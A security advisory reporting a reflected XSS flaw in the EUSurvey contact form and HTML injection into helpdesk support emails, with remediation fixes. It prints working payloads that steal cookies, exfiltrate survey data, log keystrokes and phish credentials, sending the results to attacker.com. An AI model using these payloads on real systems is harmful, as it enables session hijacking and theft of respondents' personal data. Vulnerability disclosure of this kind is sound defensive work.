# Security Report: XSS Vulnerabilities in EUSurvey Contact/Feedback Form

**Date:** 2026-08-14  
**Severity:** Medium (Reflected XSS with CSRF mitigation), Medium (HTML Injection in Email)  
**Affected Component:** Contact Form (per-survey) & Support Form (global)  
**Affected Files:**
- `src/main/java/com/ec/survey/controller/RunnerController.java`
- `src/main/java/com/ec/survey/controller/HomeController.java`
- `src/main/webapp/WEB-INF/views/runner/contactForm.jsp`

---

## Executive Summary

The EUSurvey contact/feedback form contains **two confirmed vulnerabilities**:

1. **Reflected XSS (Medium)** — When a user submits the per-survey contact form (`/runner/contactform/{survey}`) and the captcha verification fails, the application reflects user-supplied input back into the page without any sanitization or output encoding. An attacker can inject arbitrary JavaScript that executes in the victim's browser. **Direct exploitation from an external website is mitigated by Spring Security's CSRF token**, but the vulnerability remains exploitable via clickjacking (X-Frame-Options is disabled), same-origin chaining, social engineering, or against legacy browsers that don't enforce SameSite cookie defaults.

2. **HTML/JavaScript Injection in Email (Medium)** — The global support form (`/home/support`) embeds certain request parameters (`additionalsurveyinfotitle`, `additionalsurveyinfoalias`) directly into an HTML email body without sanitization. This email is sent to the internal helpdesk team, enabling potential blind XSS or phishing attacks targeting helpdesk staff.

---

## Vulnerability #1: Reflected XSS via Captcha Failure Path

### Classification

| Attribute | Value |
|-----------|-------|
| Type | CWE-79: Reflected Cross-Site Scripting |
| Severity | Medium (reduced from High due to CSRF mitigation) |
| CVSS 3.1 (estimated) | 5.4 (Medium) — AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N |
| Attack Vector | Network |
| Attack Complexity | High (CSRF token required, exploitation requires chaining or clickjacking) |
| User Interaction | Required (victim must click crafted link/submit form) |
| Authentication | None required |
| Mitigating Factors | CSRF token (session-based), HttpOnly session cookie, SameSite=Lax browser defaults |
| Aggravating Factors | X-Frame-Options disabled (clickjacking possible), SameSite not explicitly set, no output encoding in JSP |

### Affected Code

**Controller — `RunnerController.java` (lines 875–883):**

```java
@PostMapping(value = "/contactform/{uidorshortname}")
public String contactformPOST(...) throws Exception {
    // ... survey lookup ...

    if (!checkCaptcha(request)) {
        // RAW user input placed directly into model — NO SANITIZATION
        model.put("contactFormReason", request.getParameter("contactreason"));
        model.put("contactFormName", request.getParameter("name"));
        model.put("contactFormMail", request.getParameter(Constants.EMAIL));
        model.put("contactFormSubject", request.getParameter("subject"));
        model.put("contactFormMessage", request.getParameter(Constants.MESSAGE));
        model.put("survey", survey);
        model.put("wrongcaptcha", true);
        return "runner/contactForm";
    }

    // Sanitization only happens AFTER this point (success path)
    String reason = ConversionTools.removeHTML(request.getParameter("contactreason"), true, false);
    // ...
}
```

**View — `contactForm.jsp` (lines 193–202):**

```jsp
<%-- Single-quoted attribute — injectable via single quote --%>
<input type="text" ... name="name"
    value='${contactFormName != null ? contactFormName : USER != null ? USER.getFirstLastName() : "" }' />

<%-- Single-quoted attribute — injectable via single quote --%>
<input type="text" ... name="email"
    value='${contactFormMail != null ? contactFormMail : USER != null ? USER.getEmail() : "" }' />

<%-- Double-quoted attribute — injectable via double quote --%>
<input type="text" ... name="subject" value="${contactFormSubject}" />

<%-- Textarea — injectable directly, no attribute escaping needed --%>
<textarea ... name="message">${contactFormMessage}</textarea>
```

### Root Cause

The `removeHTML()` sanitization function (which uses Jsoup to strip tags + HtmlUtils to escape output) is only applied on the **success path** — after the captcha passes. On the **failure path** (captcha rejected), raw `request.getParameter()` values are placed directly into model attributes and rendered unescaped in the JSP using EL expressions (`${...}`) without `<c:out>` or `fn:escapeXml()`.

### Exploitability Analysis — CSRF Protection Assessment

Before describing exploitation steps, it's critical to assess whether the application's existing protections prevent cross-site exploitation.

#### Protections Present

| Protection | Status | Details |
|-----------|--------|---------|
| CSRF Token (Spring Security) | ✅ Enabled | `<security:csrf request-matcher-ref="csrfSecurityRequestMatcher" />` — POST requests require a valid `_csrf` token |
| CSRF Token Storage | ✅ Session-based | No `CookieCsrfTokenRepository` — token is server-side, not readable cross-origin |
| Session Cookie HttpOnly | ✅ Yes | `<http-only>true</http-only>` in `web.xml` — cookie not accessible to JavaScript |
| Session Cookie SameSite | ❌ NOT SET | Not configured in `web.xml` — relies on browser defaults |
| X-Frame-Options | ❌ DISABLED | `<security:frame-options disabled="true"/>` |
| Content-Security-Policy frame-ancestors | ⚠️ Misconfigured | Set to `${frameancestors:@null}` — not defined in standard OSS config, effectively absent |

#### Can an External Site Directly POST to the Contact Form?

**No — in most cases.** Spring Security's CSRF protection requires a valid `_csrf` token for all POST requests to `/runner/contactform/{survey}`. The `<form:form>` JSP tag automatically renders this token as a hidden field. Since the token is session-bound and stored server-side, an external attacker cannot know the victim's token.

**However, this protection has weaknesses:**

1. **SameSite cookie attribute is NOT set** — In older browsers (pre-2020) or browsers that don't default to `SameSite=Lax`, the session cookie WILL be sent with cross-site POST requests. If the attacker can somehow obtain or predict the CSRF token, the attack works.

2. **X-Frame-Options is disabled** — The page can be iframed by any external site, enabling clickjacking attacks.

3. **Modern browsers (Chrome 80+, Firefox 86+, Edge 80+)** default to `SameSite=Lax` which blocks the session cookie on cross-site POST requests. This provides implicit protection but is NOT a reliable security control — it's browser-dependent and not explicitly configured.

#### Viable Attack Vectors

Given these protections, the following attack vectors remain viable:

### Vector 1: Clickjacking (Exploitable — High Confidence)

Since `X-Frame-Options` is disabled and `frame-ancestors` is not properly configured, the contact form page can be loaded in an iframe on an attacker-controlled site. The attacker uses UI redress (clickjacking) to trick the victim into interacting with the form:

**Attack Steps:**

1. Attacker creates a page on `evil.com` that iframes `/runner/contactform/target-survey`
2. The iframe loads with the victim's session (same-origin request from the iframe) — the CSRF token is present in the form
3. The attacker overlays transparent UI elements to trick the victim into:
   - Typing a malicious payload into the message field (e.g., disguised as a game or CAPTCHA)
   - Clicking submit with an invalid captcha
4. The form submits **from within the iframe** (same-origin, valid CSRF token), captcha fails, XSS triggers inside the iframe
5. The injected script executes in the EUSurvey origin context

**Limitation:** The attacker cannot directly control what the user types, making precise XSS payload injection via clickjacking more complex. However, techniques like "drag-and-drop" clickjacking or multi-step UI manipulation can achieve this.

### Vector 2: Exploitation From Same Origin (Chaining)

If the attacker finds ANY other injection point on the EUSurvey domain (even a minor one), they can:

1. Use the first injection to read the CSRF token from the DOM
2. Programmatically submit the contact form with an XSS payload + valid CSRF token
3. The reflected XSS executes with full access

This makes the vulnerability a **force multiplier** for any other issue on the platform.

### Vector 3: Direct Cross-Site POST (Legacy Browsers / Misconfigured Proxies)

In environments where:
- The browser does not enforce `SameSite=Lax` by default (older browsers, some corporate environments)
- A reverse proxy strips or doesn't propagate cookie attributes
- The application is accessed via HTTP (not HTTPS) where SameSite isn't enforced

The classic cross-site POST attack works:

**Attack Steps:**

1. **Attacker identifies a target survey** with a contact form enabled, e.g., survey with shortname `target-survey`. The contact form is accessible at:
   ```
   https://eusurvey.example.eu/runner/contactform/target-survey
   ```

2. **Attacker obtains a valid CSRF token** by loading the contact form page themselves (the page is public, requires no authentication). The token is tied to a session cookie — the attacker notes both values.

   > **Note:** This token is tied to the ATTACKER's session, not the victim's. In the standard Spring Security implementation, this means the attacker would need the victim's token. However, if the application does not properly validate that the CSRF token matches the session, or if session fixation is possible, this could work.

3. **Alternatively**, the attacker crafts a page that:
   - First loads the contact form in a hidden iframe (if SameSite is not enforced, the victim's session is used)
   - Extracts the CSRF token from the iframe via DOM access (blocked by same-origin policy if cross-origin)
   
   **This vector is generally blocked by the browser's same-origin policy.** It only works if the attacker has same-origin access.

4. **If the CSRF check can be bypassed**, the attacker crafts a malicious HTML page:

   ```html
   <html>
   <body>
   <form id="xss" method="POST" action="https://eusurvey.example.eu/runner/contactform/target-survey">
       <input type="hidden" name="message" 
              value="</textarea><script>document.location='https://attacker.com/steal?c='+document.cookie</script>" />
       <input type="hidden" name="name" value="John" />
       <input type="hidden" name="email" value="test@test.com" />
       <input type="hidden" name="subject" value="test" />
       <input type="hidden" name="contactreason" value="other" />
       <input type="hidden" name="g-recaptcha-response" value="" />
       <input type="hidden" name="_csrf" value="STOLEN_OR_PREDICTED_TOKEN" />
   </form>
   <script>document.getElementById('xss').submit();</script>
   </body>
   </html>
   ```

5. The victim visits the page, the form auto-submits, captcha fails, XSS fires.

### Vector 4: Self-XSS + Social Engineering

An attacker instructs the victim (via social engineering) to paste a specific payload into the form's message field and submit with an incorrect captcha. While this requires significant user interaction, it bypasses all technical protections since the victim themselves submits the form with a valid CSRF token.

### Exploitation Outcome (If Any Vector Succeeds)

Regardless of the attack vector used, once the payload is reflected and JavaScript executes in the victim's browser, the result is the same:

The captcha failure is the **exploit trigger**, not a limitation. The attacker deliberately causes the captcha to fail to force the server to reflect the unsanitized input back into the page. The victim sees a contact form page load with a captcha error message while the injected script silently executes.

```
Victim's browser POSTs to EUSurvey (with XSS payload + bad captcha) →
Captcha fails → EUSurvey reflects payload in HTML response →
Victim's browser renders it → JavaScript executes on eusurvey.ec.europa.eu
```

**Example rendered output (message field payload):**
```html
<textarea ...></textarea><script>document.location='https://attacker.com/steal?c='+document.cookie</script></textarea>
```

**Example rendered output (name field payload `' onfocus='alert(1)' autofocus='`):**
```html
<input type="text" ... value='' onfocus='alert(1)' autofocus='' />
```

**Example rendered output (subject field payload `" onfocus="alert(1)" autofocus="`):**
```html
<input type="text" ... value="" onfocus="alert(1)" autofocus="" />
```

### Impact & Potential Consequences

Once JavaScript executes in the victim's browser on the EUSurvey domain, an attacker can perform any of the following:

#### 1. Session Hijacking / Account Takeover

```javascript
// Attacker steals the victim's session cookie
fetch('https://attacker.com/steal?c=' + document.cookie)
```

> **Note:** The session cookie is `HttpOnly`, so `document.cookie` will NOT include it. However, the attacker can still perform session riding (making authenticated requests from within the victim's browser session) without needing the actual cookie value. The attacker's script runs within the victim's authenticated session context.

```javascript
// Session riding — no cookie theft needed, just act as the victim
fetch('/management/surveys', {credentials: 'include'})
    .then(r => r.text())
    .then(data => fetch('https://attacker.com/exfil', {method:'POST', body: data}))
```

If the victim is a **survey manager**, the attacker gains access to:
- All their surveys and responses
- Respondent data (potentially personal data — GDPR implications)
- Ability to modify or delete surveys

If the victim is an **administrator**, full platform compromise.

#### 2. Data Theft

```javascript
// Steal all visible survey responses, CSRF tokens, personal data
fetch('/management/results').then(r => r.text()).then(data => {
    fetch('https://attacker.com/exfil', {method:'POST', body: data})
})
```

The script runs on the EUSurvey domain, so it can make authenticated requests to any EUSurvey endpoint the victim has access to — and exfiltrate the results to the attacker.

#### 3. Actions on Behalf of the Victim (CSRF Bypass)

```javascript
// Transfer survey ownership, delete surveys, modify content
fetch('/management/transfer-ownership', {
    method: 'POST',
    body: 'surveyId=123&newOwner=attacker@evil.com&_csrf=' + csrfToken
})
```

The script can perform any action the victim can — including bypassing CSRF protections since it reads the CSRF token from the same page/domain.

#### 4. Credential Phishing on Trusted Domain

```javascript
// Replace page content with a fake login form
document.body.innerHTML = '<h2>Session expired. Please log in again.</h2>' +
    '<form action="https://attacker.com/phish">' +
    '<input name="user" placeholder="Username"/>' +
    '<input name="pass" type="password" placeholder="Password"/>' +
    '<button>Log in</button></form>';
```

The victim sees a convincing login page **on the real EUSurvey domain** (the URL bar still shows `eusurvey.ec.europa.eu`). They enter their credentials, which are sent to the attacker. This is extremely effective because the victim has no visual indicator of compromise.

#### 5. Malware Distribution / Redirect

```javascript
window.location = 'https://attacker.com/malware-download';
```

The victim is redirected to a malicious site. Since the redirect came from a trusted `.europa.eu` domain, they are more likely to trust and proceed.

#### 6. Keylogging

```javascript
document.addEventListener('keydown', e => {
    fetch('https://attacker.com/log?k=' + e.key)
})
```

Captures everything the victim types on the page — including if they attempt to fill out the contact form again.

### Context-Specific Risk for EUSurvey

Given that EUSurvey is an **official EU institutional tool**, the real-world impact is amplified:

| Target | Consequence |
|--------|-------------|
| Survey managers | Leak of survey responses (potentially sensitive policy consultations, personal data of EU citizens) |
| Administrators | Full platform compromise, user management data access |
| Respondents | If tricked while filling a survey, their answers/personal info can be intercepted |
| EU institution reputation | A compromised `.europa.eu` domain used for phishing is extremely damaging to public trust |

**Most realistic attack scenario:** An attacker sends a phishing email to a survey manager saying *"I cannot access your consultation, can you check this page?"* — the link triggers the XSS, steals their session, and the attacker exfiltrates all citizen responses to that public consultation. The entire attack is invisible to the victim.

---

## Vulnerability #2: HTML/JavaScript Injection in Helpdesk Email

### Classification

| Attribute | Value |
|-----------|-------|
| Type | CWE-79: Stored/Blind XSS (via email), CWE-80: HTML Injection |
| Severity | Medium |
| CVSS 3.1 (estimated) | 4.6 (Medium) |
| Attack Vector | Network |
| User Interaction | Required (helpdesk staff must view email in vulnerable client) |
| Authentication | None required |

### Affected Code

**Controller — `HomeController.java` (lines 252–276):**

```java
private String sendSupportEmail(...) {
    // These ARE sanitized:
    String reason = ConversionTools.removeHTML(request.getParameter("contactreason"), true, false);
    String name = ConversionTools.removeHTML(request.getParameter("name"), true, false);
    String email = ConversionTools.removeHTML(request.getParameter(Constants.EMAIL), true, false);
    String subject = ConversionTools.removeHTML(request.getParameter("subject"), true, false);
    String message = ConversionTools.removeHTML(request.getParameter(Constants.MESSAGE), true, false);
    
    // These are NOT sanitized — raw from request:
    String additionalinfo = request.getParameter("additionalinfo");
    String additionalsurveyinfotitle = request.getParameter("additionalsurveyinfotitle");
    String additionalsurveyinfoalias = request.getParameter("additionalsurveyinfoalias");

    // ... later injected directly into HTML email body:
    body.append("<tr><td>Survey Title:</td><td>")
        .append(additionalsurveyinfotitle)  // UNSANITIZED
        .append("</td></tr>");

    body.append("<tr><td>Survey Alias:</td><td><a href='")
        .append(link)  // contains unsanitized additionalsurveyinfoalias
        .append("'>")
        .append(additionalsurveyinfoalias)  // UNSANITIZED
        .append("</a></td></tr>");
}
```

**Note on reachability:** This method is called as a fallback when the SMT/ServiceNow API call fails (line ~422):
```java
} catch (Exception e) {
    // fallback to email
    return sendSupportEmail(request, locale, model);
}
```

### Root Cause

The `additionalsurveyinfotitle` and `additionalsurveyinfoalias` parameters are read directly from the HTTP request without any sanitization and injected into an HTML email body. The email is sent via `MimeMessageHelper.setText(plain, body)` which delivers the HTML content as the rich-text part of a multipart email.

### Step-by-Step Exploitation

**Prerequisites:**
- The SMT/ServiceNow service must fail (timeout, misconfiguration, network issue) to trigger the email fallback — OR the application must be configured to use the email path directly
- The helpdesk recipient must view the email in a client that renders HTML (most do)

**Attack Steps:**

1. **Attacker submits the support form** at `/home/support` with crafted values:

   ```
   POST /home/support HTTP/1.1

   name=John+Doe
   email=john@example.com
   contactreason=technicalproblem
   subject=Help+needed
   message=I+need+assistance
   additionalsurveyinfotitle=<img src=x onerror="fetch('https://attacker.com/collect?cookie='+document.cookie)">
   additionalsurveyinfoalias=x' onclick='alert(1)' x='
   g-recaptcha-response=<valid_captcha>
   ```

2. **The captcha passes** (the attacker solves it legitimately).

3. **The application attempts to call the SMT service.** If it fails (or is not configured), the fallback `sendSupportEmail()` is invoked.

4. **An HTML email is generated** containing the unsanitized payload:

   ```html
   <tr><td>Survey Title:</td><td><img src=x onerror="fetch('https://attacker.com/collect?cookie='+document.cookie)"></td></tr>
   <tr><td>Survey Alias:</td><td><a href='https://eusurvey.eu/runner/x' onclick='alert(1)' x=''>x' onclick='alert(1)' x='</a></td></tr>
   ```

5. **The email is sent to the helpdesk team** (`supportEmail` or `supportEmailInternal` depending on the sender's domain).

6. **When a helpdesk agent opens the email** in their email client:
   - **If the client renders `<img>` tags** (most do, including Outlook desktop): the `onerror` handler fires and exfiltrates data
   - **If the client strips scripts but renders links**: the manipulated `<a>` tag could redirect to a phishing page or execute JavaScript via `onclick`
   - **Most modern webmail** (Gmail, Outlook.com) will strip `onerror` and `onclick`, but **desktop clients** (Outlook, Thunderbird with permissive settings) may execute them

### Additional Concern — Link Manipulation

The `additionalsurveyinfoalias` value is injected into an `href` attribute:
```java
String link = host + "runner/" + additionalsurveyinfoalias;
body.append("<a href='").append(link).append("'>");
```

An attacker can inject:
```
additionalsurveyinfoalias=x' href='https://attacker.com/phishing
```

This would produce:
```html
<a href='https://eusurvey.eu/runner/x' href='https://attacker.com/phishing'>
```

Some clients may use the second `href`, or the attacker could close the first attribute more cleanly to create a convincing phishing link that appears to come from a legitimate EUSurvey notification.

### Impact

- Blind XSS targeting helpdesk/admin staff
- Cookie/session theft from internal staff email clients
- Phishing attacks disguised as legitimate support tickets
- Potential internal network reconnaissance if internal email clients execute JavaScript

---

## Vulnerability Assessment Matrix

| # | Vulnerability | Type | Severity | Exploitable? | Data Stored? |
|---|---|---|---|---|---|
| 1 | Reflected XSS in contact form (captcha failure) | Reflected XSS | **Medium** | ⚠️ Yes, but requires clickjacking, chaining, or legacy browser (CSRF mitigates direct cross-site POST) | No |
| 2 | HTML injection in helpdesk email (additionalsurveyinfotitle) | Blind XSS / HTML Injection | **Medium** | ⚠️ Conditional (depends on email client + SMT fallback) | No (email only) |
| 3 | Link manipulation in helpdesk email (additionalsurveyinfoalias) | HTML Injection | **Medium** | ⚠️ Conditional | No (email only) |
| 4 | Missing X-Frame-Options (clickjacking) | CWE-1021 | **Medium** | ✅ Yes — enables exploitation of #1 | N/A |
| 5 | Missing SameSite cookie attribute | CWE-1275 | **Low** | ⚠️ Relies on browser defaults | N/A |

---

## Remediation Recommendations

### Fix #1 — Reflected XSS (Critical Priority)

**Option A: Sanitize on the failure path (minimal change):**

```java
// RunnerController.java, line 875
if (!checkCaptcha(request)) {
    model.put("contactFormReason", ConversionTools.removeHTML(request.getParameter("contactreason"), true, false));
    model.put("contactFormName", ConversionTools.removeHTML(request.getParameter("name"), true, false));
    model.put("contactFormMail", ConversionTools.removeHTML(request.getParameter(Constants.EMAIL), true, false));
    model.put("contactFormSubject", ConversionTools.removeHTML(request.getParameter("subject"), true, false));
    model.put("contactFormMessage", ConversionTools.removeHTML(request.getParameter(Constants.MESSAGE), true, false));
    model.put("survey", survey);
    model.put("wrongcaptcha", true);
    return "runner/contactForm";
}
```

**Option B: Defense-in-depth at the view layer (recommended in addition to A):**

```jsp
<%-- Use <c:out> which HTML-escapes by default --%>
<input type="text" ... name="name" value="<c:out value='${contactFormName != null ? contactFormName : USER != null ? USER.getFirstLastName() : "" }' />" />

<input type="text" ... name="email" value="<c:out value='${contactFormMail != null ? contactFormMail : USER != null ? USER.getEmail() : "" }' />" />

<input type="text" ... name="subject" value="<c:out value='${contactFormSubject}' />" />

<textarea ...><c:out value="${contactFormMessage}" /></textarea>
```

### Fix #2 — Email HTML Injection (High Priority)

```java
// HomeController.java, sendSupportEmail method
String additionalinfo = request.getParameter("additionalinfo");
String additionalsurveyinfotitle = ConversionTools.removeHTML(request.getParameter("additionalsurveyinfotitle"), true, false);
String additionalsurveyinfoalias = ConversionTools.removeHTML(request.getParameter("additionalsurveyinfoalias"), true, false);
```

### Fix #3 — Enable X-Frame-Options (High Priority)

The disabled `X-Frame-Options` header is what makes the reflected XSS exploitable via clickjacking. Re-enable it:

```xml
<!-- spring-security.xml — change from: -->
<security:frame-options disabled="true"/>

<!-- To: -->
<security:frame-options policy="SAMEORIGIN"/>
```

If the application needs to be framed by specific external domains, use `frame-ancestors` in CSP with an explicit allowlist instead of disabling protection entirely.

### Fix #4 — Set SameSite Cookie Attribute (Medium Priority)

Explicitly set `SameSite=Lax` (or `Strict`) on session cookies rather than relying on browser defaults:

```xml
<!-- In web.xml or via Tomcat's context.xml -->
<session-config>
    <cookie-config>
        <http-only>true</http-only>
        <secure>true</secure>
        <!-- Tomcat 9.0.21+ supports this via CookieProcessor in context.xml -->
    </cookie-config>
</session-config>
```

For Tomcat 9, add to `context.xml`:
```xml
<CookieProcessor sameSiteCookies="Lax" />
```

### Fix #5 — Global Hardening (Long-term)

1. **Enable default HTML escaping in Spring MVC:**
   Add to `web.xml`:
   ```xml
   <context-param>
       <param-name>defaultHtmlEscape</param-name>
       <param-value>true</param-value>
   </context-param>
   ```

2. **Add Content-Security-Policy header** to prevent inline script execution:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
   ```

3. **Audit all JSP files** for raw EL expressions (`${...}`) used in HTML context without `<c:out>` encoding.

---

## Conclusion

The reported XSS vulnerability is **confirmed**. The reflected XSS in the contact form captcha failure path is a real vulnerability — unsanitized user input is rendered directly into the page HTML.

**Regarding exploitability:** Direct cross-site exploitation is mitigated by Spring Security's CSRF token (session-bound, required on POST). However, the vulnerability remains exploitable through:
- **Clickjacking** (X-Frame-Options is disabled, allowing the page to be iframed)
- **Same-origin chaining** (if any other injection point exists on the domain)
- **Legacy browsers** that don't enforce SameSite=Lax by default
- **Social engineering** (self-XSS)

The vulnerability should still be fixed because:
1. It violates defense-in-depth principles — security should not depend on a single control (CSRF)
2. The disabled X-Frame-Options makes clickjacking-based exploitation viable
3. The CSRF protection could be bypassed if another vulnerability is found on the same origin
4. The missing SameSite attribute means older browser environments are fully exposed
5. The fix is trivial (add output encoding or sanitize on the failure path)

The email injection vulnerability is lower severity due to the dependence on email client behavior, but still represents a real risk to internal helpdesk staff, particularly those using desktop email clients.

Both issues stem from inconsistent application of input sanitization — the correct sanitization functions exist in the codebase (`ConversionTools.removeHTML`) but are not applied uniformly across all code paths.
